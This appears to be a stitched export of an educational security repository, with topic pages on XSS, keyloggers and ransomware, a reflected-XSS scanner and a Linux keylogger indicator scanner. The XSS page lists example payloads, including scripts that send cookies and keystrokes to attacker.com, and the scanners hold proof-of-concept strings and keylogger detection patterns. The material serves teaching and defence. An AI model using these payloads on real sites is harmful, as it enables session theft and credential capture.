    db = SecureDatabaseQueries(db_type='sqlite', db_name='secure_app.db')
    
    if db.connect():
        # Create table
        db.create_users_table()
        
        # Add users securely
        print("\n" + "-"*40)
        print("ADDING USERS SECURELY")
        print("-"*40)
        
        db.add_user_secure("alice", "alice@example.com", "SecurePass123!")
        db.add_user_secure("bob", "bob@example.com", "AnotherPass456!")
        db.add_user_secure("charlie", "charlie@example.com", "CharliePass789!")
        
        # Retrieve users
        print("\n" + "-"*40)
        print("RETRIEVING USERS SECURELY")
        print("-"*40)
        
        db.get_user_secure("alice")
        
        # Search users
        print("\n" + "-"*40)
        print("SEARCHING USERS SECURELY")
        print("-"*40)
        
        db.search_users_secure("alice")
        
        # Update user
        print("\n" + "-"*40)
        print("UPDATING USER SECURELY")
        print("-"*40)
        
        db.update_email_secure(1, "alice.new@example.com")
        
        # Demonstrate SQL injection concept
        db.demonstrate_injection_attack()
        
        # Close connection
        db.close()
    
    print("\n" + "="*60)
    print("✅ SECURE CODING PRACTICES IMPLEMENTED:")
    print("• Parameterized queries for all database operations")
    print("• Password hashing (never stored in plaintext)")
    print("• Proper error handling")
    print("• Input validation (implicitly through parameterization)")
    print("="*60)

if __name__ == "__main__":
    main()

topics.title: Cross-Site Scripting (XSS)
topics.summary: Cross-Site Scripting (XSS) is a client-side code injection attack where attackers inject malicious scripts into trusted websites. When users visit the compromised page, the script executes in their browser, potentially stealing cookies, session tokens, or performing actions on their behalf.
topics.html:
Description

Cross-Site Scripting (XSS) is a client-side code injection attack where attackers inject malicious scripts into trusted websites. When users visit the compromised page, the script executes in their browser, potentially stealing cookies, session tokens, or performing actions on their behalf.

Attack Types

1. Reflected XSS (Non-Persistent)

  • Malicious script is part of the request (URL)
  • Server reflects the script in response
  • Requires user interaction (clicking link)

2. Stored XSS (Persistent)

  • Malicious script is stored on the server
  • Affects all users viewing the compromised page
  • Most dangerous type of XSS

3. DOM-based XSS

  • Vulnerability in client-side JavaScript
  • Server never receives the malicious payload
  • Uses document.location, document.URL, etc.

Detection Methods

Manual Detection

  1. Input Testing: Insert script tags, HTML events
  2. Context Analysis: Check where input appears
  3. DOM Inspection: Review JavaScript code
  4. Alert Boxes: Test with alert(1) payloads

Automated Detection

  • XSS Detector - Automated XSS scanning
  • CSP Analyzer - Content Security Policy analysis (planned)

Prevention Strategies

Primary Defenses

  1. Output Encoding (Context-aware)
  2. Content Security Policy (CSP)
  3. Input Validation (Whitelist approach)
  4. HTTPOnly Cookies (Prevent cookie theft)

Prevention Examples

  • Output Encoding - Context-aware encoding
  • CSP Headers - Content Security Policy implementation (planned)

Attack Flow

flowchart LR
    A[Attacker] -->|Injects Malicious Script| B[Vulnerable Web Application]
    B --> C[Victim Visits Page]
    C --> D[Script Executes in Browser]
    D --> E[Steals Sensitive Data]
    E --> F[Sends Data Back to Attacker]

Best Practices

For Developers

// GOOD - Use textContent instead of innerHTML
element.textContent = userInput;

// BAD - Vulnerable to XSS
element.innerHTML = userInput;

Content Security Policy

Content-Security-Policy: default-src 'self'; 
                        script-src 'self' https://trusted.cdn.com;
                        style-src 'self';
                        img-src 'self' data:;

Example Payloads

Basic XSS

<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

Cookie Stealing

<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

Keylogging

<script>
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log?key='+e.key);
});
</script>

Warning

Only test Cross-Site Scripting (XSS) vulnerabilities on applications you own or have explicit permission to test.

Unauthorized testing is illegal and unethical.

References

  • OWASP Cross-Site Scripting (XSS)
  • PortSwigger XSS Guide
  • Content Security Policy (CSP) Reference

#!/usr/bin/env python3
"""
XSS Vulnerability Detector (reflected XSS)
Location: 02-web-application-security/xss-attacks/detection/xss_detector.py

Checks the GET parameters of a web application you own (or have written
permission to test) for reflected cross-site scripting.

Method: instead of firing a long list of attack strings and regex-matching the
whole page, the scanner sends a harmless random marker next to the characters
that matter (< > " '), finds where the marker is reflected, works out the HTML
context (body text, attribute, <script>, comment) and reports which characters
come back un-encoded. A page that HTML-encodes its output (the correct fix) is
therefore reported as safe, and nothing executable is ever sent.

Exit codes: 0 = no finding, 1 = vulnerability found, 2 = scan could not complete.
"""

import argparse
import json
import re
import secrets
import sys
from datetime import datetime
from urllib.parse import parse_qsl, quote, urlencode, urlsplit, urlunsplit

import requests
from colorama import Fore, Style, init

init(autoreset=True)

# What an attacker needs in each context, and a manual proof-of-concept to try.
CONTEXT_RULES = {
    "HTML body":      {"needs": ("lt", "gt"), "poc": "<svg onload=alert(1)>",
                       "why": "tags can be injected into the page body"},
    "HTML comment":   {"needs": ("lt", "gt"), "poc": "--><svg onload=alert(1)>",
                       "why": "the comment can be closed and tags injected"},
    "script block":   {"needs": ("sq",), "poc": "';alert(1);//",
                       "why": "a JavaScript string can be broken out of"},
    "attribute (double-quoted)": {"needs": ("dq",), "poc": '" autofocus onfocus=alert(1) x="',
                       "why": "the attribute value can be closed and an event handler added"},
    "attribute (single-quoted)": {"needs": ("sq",), "poc": "' autofocus onfocus=alert(1) x='",
                       "why": "the attribute value can be closed and an event handler added"},
    "attribute (unquoted)": {"needs": (), "poc": " autofocus onfocus=alert(1) ",
                       "why": "a space is enough to add an event handler"},
}


class XSSDetector:
    def __init__(self, target_url, timeout=10, cookie=None, proxy=None):
        if urlsplit(target_url).scheme not in ("http", "https"):
            raise ValueError("Target URL must start with http:// or https://")
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Security Scanner - Educational Purpose)"})
        if cookie:
            self.session.headers.update({"Cookie": cookie})
        if proxy:
            self.session.proxies.update({"http": proxy, "https": proxy})
        self.results = {"target": target_url, "timestamp": datetime.now().isoformat(),
                        "scan_completed": False, "error": None, "vulnerable": False,
                        "vulnerabilities": [], "summary": {}}

    # ------------------------------------------------------------------ helpers
    def extract_parameters(self):
        return parse_qsl(urlsplit(self.target_url).query, keep_blank_values=True)

    def send(self, param, value):
        """GET the target with `param` replaced by `value`. Returns the response or None on a network error."""
        pairs = [(k, value if k == param else v) for k, v in self.extract_parameters()]
        parts = urlsplit(self.target_url)
        url = urlunsplit(parts._replace(query=urlencode(pairs, quote_via=quote)))
        try:
            return self.session.get(url, timeout=self.timeout, allow_redirects=True)
        except requests.exceptions.RequestException:
            return None

    @staticmethod
    def determine_context(text, position):
        """Classify what surrounds `position` in the HTML."""
        before = text[:position]
        lower = before.lower()

        if lower.rfind("<!--") > lower.rfind("-->"):
            return "HTML comment", None
        if lower.rfind("<script") > lower.rfind("</script"):
            return "script block", None

        last_open, last_close = before.rfind("<"), before.rfind(">")
        if last_open > last_close:                       # inside a tag, i.e. an attribute value
            tag = before[last_open:]
            quote_char = None
            match = re.search(r"=\s*([\"']?)[^\"'<>]*$", tag)
            if match:
                quote_char = match.group(1)
            if quote_char == '"':
                return "attribute (double-quoted)", '"'
            if quote_char == "'":
                return "attribute (single-quoted)", "'"
            return "attribute (unquoted)", None
        return "HTML body", None

    # ------------------------------------------------------------------ testing
    def test_parameter(self, param, original):
        print(f"\n{Fore.CYAN}[*] Testing parameter: {param}{Style.RESET_ALL}")
        core = "xs" + secrets.token_hex(4)

        # Request 1: plain marker only. The page is untouched by special characters, so the
        # context at every reflection point is classified correctly.
        plain = self.send(param, core)
        if plain is None:
            print(f"{Fore.YELLOW}  [!] No response, skipping{Style.RESET_ALL}")
            return []
        contexts = []
        for match in re.finditer(re.escape(core), plain.text):
            context, _ = self.determine_context(plain.text, match.start())
            if context not in contexts:
                contexts.append(context)
        if not contexts:
            print("  [-] Value is not reflected in the response")
            return []

        # Request 2: marker next to each special character, to see which come back un-encoded.
        probe = f"{core}lt<{core}gt>{core}dq\"{core}sq'{core}end"
        probed = self.send(param, probe)
        if probed is None:
            print(f"{Fore.YELLOW}  [!] No response to the probe, skipping{Style.RESET_ALL}")
            return []
        survives = {
            "lt": f"{core}lt<" in probed.text,
            "gt": f"{core}gt>" in probed.text,
            "dq": f'{core}dq"' in probed.text,
            "sq": f"{core}sq'" in probed.text,
        }

        findings = []
        for context in contexts:
            rule = CONTEXT_RULES[context]
            if all(survives[c] for c in rule["needs"]):
                findings.append({
                    "parameter": param, "type": "Reflected XSS", "context": context,
                    "evidence": "unencoded characters reflected: " +
                                (", ".join({"lt": "<", "gt": ">", "dq": '"', "sq": "'"}[c] for c in survives if survives[c]) or "none needed"),
                    "explanation": rule["why"], "manual_poc": rule["poc"],
                    "response_code": probed.status_code,
                })
                print(f"{Fore.RED}  [!] Reflected XSS in context: {context}{Style.RESET_ALL}")
                print(f"      {rule['why']}")
        if not findings:
            print(f"{Fore.GREEN}  [+] Reflected but special characters are encoded - no XSS{Style.RESET_ALL}")
        return findings

    def scan(self):
        print(f"\n{Fore.CYAN}[*] Target: {self.target_url}{Style.RESET_ALL}")
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            print(f"{Fore.GREEN}[+] Target is reachable (HTTP {response.status_code}){Style.RESET_ALL}")
        except requests.exceptions.RequestException as exc:
            self.results["error"] = f"Target unreachable: {exc}"
            print(f"{Fore.RED}[x] {self.results['error']}{Style.RESET_ALL}")
            return self.results

        parameters = self.extract_parameters()
        if not parameters:
            self.results["error"] = "No query parameters found in the URL (add e.g. ?q=test)"
            print(f"{Fore.YELLOW}[!] {self.results['error']}{Style.RESET_ALL}")
            return self.results

        vulnerabilities = []
        for name, value in parameters:
            vulnerabilities.extend(self.test_parameter(name, value))

        self.results["vulnerabilities"] = vulnerabilities
        self.results["vulnerable"] = bool(vulnerabilities)
        self.results["summary"] = {
            "total_parameters": len(parameters),
            "vulnerable_parameters": len({v["parameter"] for v in vulnerabilities}),
            "total_vulnerabilities": len(vulnerabilities),
        }
        self.results["scan_completed"] = True
        return self.results

    def print_report(self):
        bar = "=" * 60
        print(f"\n{Fore.CYAN}{bar}\nXSS SCAN REPORT\n{bar}{Style.RESET_ALL}")
        if not self.results["scan_completed"]:
            print(f"\n{Fore.RED}[x] SCAN DID NOT COMPLETE - no conclusion can be drawn.{Style.RESET_ALL}")
            print(f"    Reason: {self.results['error']}")
            return
        if self.results["vulnerable"]:
            print(f"\n{Fore.RED}[!] XSS VULNERABILITIES DETECTED{Style.RESET_ALL}")
            for i, vuln in enumerate(self.results["vulnerabilities"], 1):
                print(f"\n  {i}. Parameter: {vuln['parameter']}  Context: {vuln['context']}")
                print(f"     Evidence: {vuln['evidence']}")
                print(f"     Meaning:  {vuln['explanation']}")
                print(f"     Try manually in a test browser: {vuln['manual_poc']}")
            print("\n  Fix: HTML-encode untrusted data for the context where it is printed, and add a Content-Security-Policy.")
        else:
            print(f"\n{Fore.GREEN}[+] No reflected XSS found in the tested parameters.{Style.RESET_ALL}")
            print("    Stored and DOM-based XSS are not covered by this scanner.")

    def save_results(self, output_file):
        try:
            with open(output_file, "w") as handle:
                json.dump(self.results, handle, indent=2)
            print(f"{Fore.GREEN}[+] Results saved to {output_file}{Style.RESET_ALL}")
        except OSError as exc:
            print(f"{Fore.RED}[x] Could not save results: {exc}{Style.RESET_ALL}")


def confirm_permission(assume_yes):
    if assume_yes:
        print(f"{Fore.YELLOW}[i] --yes given: you are confirming you may test this target.{Style.RESET_ALL}")
        return True
    try:
        answer = input(f"{Fore.YELLOW}[?] Do you have permission to test this target? (yes/no): {Style.RESET_ALL}")
    except EOFError:
        print(f"\n{Fore.RED}[!] No interactive input available. Re-run with --yes if you are authorized.{Style.RESET_ALL}")
        return False
    return answer.strip().lower() == "yes"


def main():
    parser = argparse.ArgumentParser(description="Reflected XSS scanner (non-destructive)")
    parser.add_argument("-u", "--url", required=True, help="Target URL, e.g. http://localhost:8080/search?q=test")
    parser.add_argument("-o", "--output", help="Write results to this JSON file")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--cookie", help='Session cookie, e.g. "session=abc123"')
    parser.add_argument("--proxy", help="Proxy server, e.g. http://127.0.0.1:8080")
    parser.add_argument("--yes", action="store_true", help="Skip the permission prompt (you confirm you are authorized)")
    args = parser.parse_args()

    if not confirm_permission(args.yes):
        print(f"{Fore.RED}[!] Exiting. Only test systems you own or have written permission to test.{Style.RESET_ALL}")
        return 2
    try:
        scanner = XSSDetector(args.url, args.timeout, args.cookie, args.proxy)
    except ValueError as exc:
        print(f"{Fore.RED}[x] {exc}{Style.RESET_ALL}")
        return 2

    scanner.scan()
    scanner.print_report()
    if args.output:
        scanner.save_results(args.output)
    if not scanner.results["scan_completed"]:
        return 2
    return 1 if scanner.results["vulnerable"] else 0


if __name__ == "__main__":
    sys.exit(main())

topics.summary: A keylogger records what a user types so the attacker can collect passwords, messages and card numbers. Software keyloggers run on the victim's machine; hardware keyloggers sit between the keyboard and the computer.

Last reviewed: 2026-10-11 | Status: Draft (new topic; scripts tested against local lab targets, references not yet independently re-verified)

Standards mapping

FrameworkReference
OWASP Top 10:2025not applicable
MITRE ATT&CK (v19)Collection / T1056.001 Input Capture: Keylogging
CWEnot applicable
CAPECCAPEC-568 Capture Credentials via Keylogger
Example CVEnot applicable

What it is

A keylogger records what a user types so the attacker can collect passwords, messages and card numbers. Software keyloggers run on the victim's machine; hardware keyloggers sit between the keyboard and the computer.

How it works

Software keyloggers hook the operating system's input path: API hooks, kernel drivers, reading input devices directly, injecting code into browsers, or intercepting library calls. They store the keystrokes and send them to the attacker. Some also capture clipboard contents and screenshots.

Real-world example

The Zeus banking trojan family is a long-documented example of malware that captured credentials as users typed them into banking sites. Add a primary source when expanding this section.

Detection

  • Processes holding keyboard devices (/dev/input/event*) open that are not the desktop's input stack
  • LD_PRELOAD or a non-empty /etc/ld.so.preload (userland hooks)
  • Known keylogger program names and input-hooking modules in running scripts
  • Unexpected autostart entries, new kernel modules, outbound traffic from unusual processes

Prevention

In order of strength. The first items fix the cause; the rest reduce risk.

  1. Use a password manager with autofill (nothing is typed, so there is nothing to log)
  2. Use phishing-resistant MFA (passkeys, hardware keys) so a captured password is not enough
  3. Keep systems patched and run endpoint protection; limit who can install drivers or load kernel modules
  4. Application allow-listing
  5. Inspect hardware: check the cable between keyboard and PC on shared or public machines

Scripts in this topic

  • keylogger_detector.py: Linux indicator scanner

Common mistakes

  • Believing on-screen keyboards stop all keyloggers (screen capture still works)
  • Assuming no alerts means no keylogger: the scanner only finds indicators
  • Removing a suspected keylogger without first changing passwords from a different, clean device

Test it safely

The scanner never records keystrokes. Test it by opening a harmless file under a fake --input-glob folder as shown in the project tests. Windows and macOS need different tooling (Sysinternals Autoruns and Process Explorer, or macOS Privacy settings under Input Monitoring).

References

  • MITRE ATT&CK T1056.001
  • CAPEC-568

#!/usr/bin/env python3
"""
Keylogger indicator scanner (Linux)
Location: 03-malware-analysis/keyloggers/detection/keylogger_detector.py

DEFENSIVE tool: it looks for the traces a keylogger leaves on a Linux machine and never captures
keystrokes itself.

  INPUT_DEVICE   a process holds a keyboard device (/dev/input/event*) open that is not on the
                 allow-list of normal input stacks (Xorg, Wayland compositors, libinput, ...)
  LD_PRELOAD     a process was started with LD_PRELOAD, or /etc/ld.so.preload is non-empty
                 (userland hooks can intercept library calls such as read())
  KNOWN_TOOL     a running process looks like a known keylogger (logkeys, lkl, pykeylogger ...)
  SCRIPT_HOOK    an interpreter command line references input-hooking modules (pynput, keyboard, evdev)

Every finding is an INDICATOR: remote-desktop tools, accessibility software and gaming overlays
also read input devices. Investigate before acting. Run as root to see other users' processes.
Windows and macOS need different tooling (see README).

Exit codes: 0 = no indicators, 1 = indicators found, 2 = unsupported platform.
"""

import argparse
import glob
import json
import os
import re
import sys

ALLOWED = {"xorg", "xwayland", "gnome-shell", "kwin_wayland", "kwin_x11", "mutter", "weston", "sway", "systemd-logind",
           "libinput", "upowerd", "gsd-power", "gsd-media-keys", "ibus-daemon", "fcitx", "fcitx5", "sddm", "gdm", "lightdm",
           "plasmashell", "kglobalaccel5", "kglobalacceld", "cosmic-comp", "hyprland"}
KNOWN_TOOLS = re.compile(r"\b(logkeys|lkl|uberkey|pykeylogger|keysniffer|xkeylog|skeylogger|keylogger)\b", re.I)
HOOK_MODULES = re.compile(r"\b(pynput|evdev|python-xlib|keyboard\.on_press|pyxhook)\b", re.I)
SYSTEM_LIB_DIRS = ("/lib/", "/lib64/", "/usr/lib/", "/usr/lib64/", "/usr/local/lib/")


def read(path, binary=False):
    try:
        with open(path, "rb") as handle:
            data = handle.read()
        return data if binary else data.decode(errors="replace")
    except OSError:
        return ""


def scan(input_glob="/dev/input/event*", proc_root="/proc", preload_file="/etc/ld.so.preload", allowed=ALLOWED):
    findings = []
    devices = {os.path.realpath(p) for p in glob.glob(input_glob)}
    me = os.getpid()
    for pid in filter(str.isdigit, os.listdir(proc_root)):
        if int(pid) == me:
            continue
        base = os.path.join(proc_root, pid)
        name = read(os.path.join(base, "comm")).strip()
        cmdline = read(os.path.join(base, "cmdline"), binary=True).replace(b"\0", b" ").decode(errors="replace").strip()

        try:
            for fd in os.listdir(os.path.join(base, "fd")):
                target = os.path.realpath(os.path.join(base, "fd", fd))
                if target in devices and name.lower() not in allowed:
                    findings.append({"type": "INPUT_DEVICE", "severity": "HIGH", "pid": int(pid), "process": name,
                                     "detail": f"holds input device {target} open"})
                    break
        except OSError:
            pass

        for entry in read(os.path.join(base, "environ")).split("\0"):
            if entry.startswith("LD_PRELOAD="):
                library = entry.split("=", 1)[1]
                outside = not library.startswith(SYSTEM_LIB_DIRS)
                findings.append({"type": "LD_PRELOAD", "severity": "HIGH" if outside else "MEDIUM", "pid": int(pid),
                                 "process": name, "detail": f"LD_PRELOAD={library}" + (" (outside system library dirs)" if outside else "")})

        argv = cmdline.split()
        candidates = {name, *(os.path.basename(a) for a in argv[:2])}      # program and script name only
        if any(KNOWN_TOOLS.search(c) for c in candidates):
            findings.append({"type": "KNOWN_TOOL", "severity": "HIGH", "pid": int(pid), "process": name,
                             "detail": cmdline[:120]})
        elif name.lower().startswith(("python", "perl", "ruby", "node")) and HOOK_MODULES.search(cmdline):
            findings.append({"type": "SCRIPT_HOOK", "severity": "LOW", "pid": int(pid), "process": name,
                             "detail": cmdline[:120]})

    preload = [l.strip() for l in read(preload_file).splitlines() if l.strip() and not l.startswith("#")]
    if preload:
        findings.append({"type": "LD_PRELOAD", "severity": "HIGH", "pid": 0, "process": "-",
                         "detail": f"{preload_file} is not empty: {', '.join(preload)}"})
    return findings


def main():
    parser = argparse.ArgumentParser(description="Keylogger indicator scanner (Linux)")
    parser.add_argument("-o", "--output")
    parser.add_argument("--input-glob", default="/dev/input/event*", help=argparse.SUPPRESS)
    args = parser.parse_args()
    if not sys.platform.startswith("linux"):
        print("[x] This scanner supports Linux only. See the README for Windows and macOS guidance.")
        return 2
    if os.geteuid() != 0:
        print("[i] Not running as root: processes owned by other users cannot be inspected.")
    findings = scan(args.input_glob)
    for f in findings:
        print(f"  [{f['severity']}] {f['type']}: pid {f['pid']} ({f['process']}) {f['detail']}")
    print("[+] No keylogger indicators found." if not findings else f"[!] {len(findings)} indicator(s): investigate before acting")
    if args.output:
        json.dump(findings, open(args.output, "w"), indent=2)
    return 1 if [f for f in findings if f["severity"] != "LOW"] else 0


if __name__ == "__main__":
    sys.exit(main())

topics.html:
Description

Ransomware is a type of malware that encrypts files or locks systems, demanding payment (ransom) for decryption. It's one of the most damaging cyber threats, affecting individuals, businesses, and critical infrastructure.

Types of Ransomware

1. Encrypting Ransomware

  • Crypto ransomware - Encrypts files
  • Uses strong encryption (AES, RSA)
  • Demands payment for decryption key

2. Locker Ransomware

  • Locks user out of system
  • Doesn't encrypt files
  • Shows fake law enforcement notices

3. Doxware (Leakware)

  • Threatens to publish stolen data
  • Double-extortion tactics
  • Data breach + encryption

Detection Methods

Behavioral Indicators

  • Rapid file modifications
  • Mass file renaming
  • Suspicious processes
  • Network connections to TOR/C2

Detection Scripts

  • Ransomware Behavior - Behavioral analysis
  • File Monitor - Real-time file change detection

Prevention Strategies

Technical Controls

  1. Regular Backups - 3-2-1 backup strategy
  2. Application Whitelisting - Only approved software
  3. Email Filtering - Block malicious attachments
  4. Patch Management - Keep systems updated
  5. Network Segmentation - Limit lateral movement

Prevention Scripts

  • Backup System - Automated backup solution
  • App Whitelisting - Application control

Attack Flow

flowchart TD

    A["📧 Phishing Email"] --> B["🖱️ User Clicks Malicious Link or Attachment"]
    B --> C["⬇️ Malware Drops Payload"]
    C --> D["🔐 Encryption Begins"]
    D --> E["📝 Files Renamed: .locked or .encrypted"]
    E --> F["📄 Ransom Note Created"]
    F --> G["💰 Payment Demand Displayed"]

    %% Styling
    classDef initial fill:#1f77b4,color:#ffffff,stroke:#0d3b66,stroke-width:2px;
    classDef action fill:#ff7f0e,color:#ffffff,stroke:#8c2f00,stroke-width:2px;
    classDef impact fill:#d62728,color:#ffffff,stroke:#7f0000,stroke-width:2px;

    class A,B initial;
    class C,D,E action;
    class F,G impact;

Ransomware Indicators

File System Changes

  • Files renamed with new extensions (.encrypted, .locked)
  • Ransom notes (README.txt, HOW_TO_DECRYPT.html)
  • Desktop wallpaper changed
  • Shadow copies deleted

Process Behavior

  • Volume Shadow Copy deletion
  • Windows Backup removal
  • Encrypting processes
  • TOR network connections

Best Practices

3-2-1 Backup Strategy

flowchart TD

    A[💾 3 Copies of Data] --> B[📀 2 Different Media Types]
    B --> C[☁️ 1 Copy Offsite]

    %% Sub-details
    A --> A1[Primary Data]
    A --> A2[Local Backup]
    A --> A3[Secondary Backup]

    B --> B1[External HDD / NAS]
    B --> B2[Cloud Storage / Tape]

    C --> C1[Cloud Provider]
    C --> C2[Remote Location]

    %% Styling for clarity
    classDef main fill:#1f4e79,color:#ffffff,stroke:#0b2e4a,stroke-width:3px;
    classDef detail fill:#d9eaf7,color:#000000,stroke:#1f4e79,stroke-width:1.5px;

    class A,B,C main;
    class A1,A2,A3,B1,B2,C1,C2 detail;

Incident Response

# 1. Isolate infected system
# 2. Preserve evidence
# 3. Identify ransomware family
# 4. Check for decryptors
# 5. Restore from backups
# 6. NEVER pay the ransom

Ransomware Families

FamilyTypeExtensionsNotes
WannaCryEncrypting.wncryUsed EternalBlue exploit
RyukEncrypting.rykTargeted attacks
LockyEncrypting.lockySpread via email campaigns
REvilDoxware.REvilDouble extortion model
MazeDoxware.mazeData theft before encryption

Critical Warning

🚫 NEVER PAY THE RANSOM

  • ❌ No guarantee files will be restored
  • 💰 Funds criminal activities
  • 📈 Encourages more attacks
  • 🎯 May mark you as a repeat target

References

  • No More Ransom
  • Ransomware Tracker
  • CISA Ransomware Guide
